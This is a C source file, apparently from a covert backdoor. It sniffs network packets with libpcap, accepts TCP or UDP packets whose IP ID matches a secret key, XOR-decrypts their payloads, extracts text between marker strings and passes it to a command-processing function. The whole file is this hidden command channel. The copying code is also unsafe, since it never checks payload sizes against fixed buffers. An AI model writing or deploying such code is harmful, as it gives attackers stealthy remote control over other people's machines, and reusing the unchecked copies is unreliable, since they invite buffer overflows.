#include "raw_socket.h"
#include "config.h"

/* Check all the headers in the Ethernet frame */
void pkt_callback(u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet) {
    u_int caplen = pkthdr->caplen;
	struct ether_header *eptr;      /* net/ethernet.h */
	u_short ether_type;

    if (caplen < ETHER_HDRLEN)
        return;

    eptr = (struct ether_header *) packet;
    ether_type = ntohs(eptr->ether_type);

    if(ether_type == ETHERTYPE_IP) {
        handle_IP(args,pkthdr,packet);
	}    	
}

/* Parse the IP header */
void handle_IP (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet) {

    const struct my_ip* ip;
    u_int length = pkthdr->len;
    int len;

    // Jump past the Ethernet header 
    ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    length -= sizeof(struct ether_header); 

    // make sure that the packet is of a valid length 
    if (length < sizeof(struct my_ip))
        return;

    len = ntohs(ip->ip_len);
    // Ensure that we have as much of the packet as we should 
    if (length < len)
        return;

    if(ip->ip_id == HEADERKEY) {
        switch (ip->ip_p) {
        case IPPROTO_TCP:
            handle_TCP (args, pkthdr, packet);
            break;
        case IPPROTO_UDP:
            handle_UDP (args, pkthdr, packet);
            break;
        default:
            break;
        }
    }
}

/* Parse the TCP header */
void handle_TCP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
	const struct sniff_tcp *tcp=0;          // The TCP header 
	const struct my_ip *ip;              	// The IP header 
    const char *payload;                    // Packet payload 

  	int size_ip;
    int size_tcp;
    int size_payload;
  
    ip = (struct my_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL (ip)*4;
       
    // define/compute tcp header offset
    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp)*4;
        
    if (size_tcp < 20) 
        return;

    // define/compute tcp payload (segment) offset
    payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
        
    // compute tcp payload (segment) size
    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
    
    // if has payload
    if (size_payload > 0) {
        //unsigned char *decrypted = decrypt((unsigned char*)payload);
        char decryptedtext[STR_SIZE];
        memset(decryptedtext, 0, STR_SIZE);
        encryptDecrypt(decryptedtext,payload,XORKEY);
        char *ptr, *ptr2;
        if (!(ptr = strstr((char *)decryptedtext, HEADER)))
            return;

        ptr += strlen(HEADER);
        if (!(ptr2 = strstr(ptr, FOOTER)))
            return;

        char data[STR_SIZE];
        memset(data, 0, STR_SIZE);
        strncpy(data, ptr, (ptr2 - ptr));
        process_command(data);
    }
    return;
}

/* Parse the UDP header */
void handle_UDP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
	const struct sniff_udp *udp=0;          // The UDP header 
	const struct my_ip *ip;              	// The IP header 
    const char *payload;                    // Packet payload 

  	int size_ip;
    int size_payload;
	
    ip = (struct my_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL (ip)*4;
       
    // define/compute udp header 
    udp = (struct sniff_udp*)(packet + SIZE_ETHERNET + size_ip);
    if (udp->uh_len < 8)
        return;
    
    // define/compute udp payload 
    payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + 8);   
    // compute udp payload (segment) size
    size_payload = ntohs(ip->ip_len) - (size_ip + 8);

    // if has payload
    if (size_payload > 0) {
        //unsigned char *decrypted = decrypt((unsigned char*)payload);
        char decryptedtext[STR_SIZE];
        memset(decryptedtext, 0, STR_SIZE);
        encryptDecrypt(decryptedtext,payload,XORKEY);
        char *ptr, *ptr2;
        if (!(ptr = strstr((char *)decryptedtext, HEADER))) 
            return;
        
        ptr += strlen(HEADER);
        if (!(ptr2 = strstr(ptr, FOOTER))) 
            return;
        
        char data[MAX_SIZE];
        memset(data, 0, MAX_SIZE);
        strncpy(data, ptr, (ptr2 - ptr));
        process_command(data);
    }
}
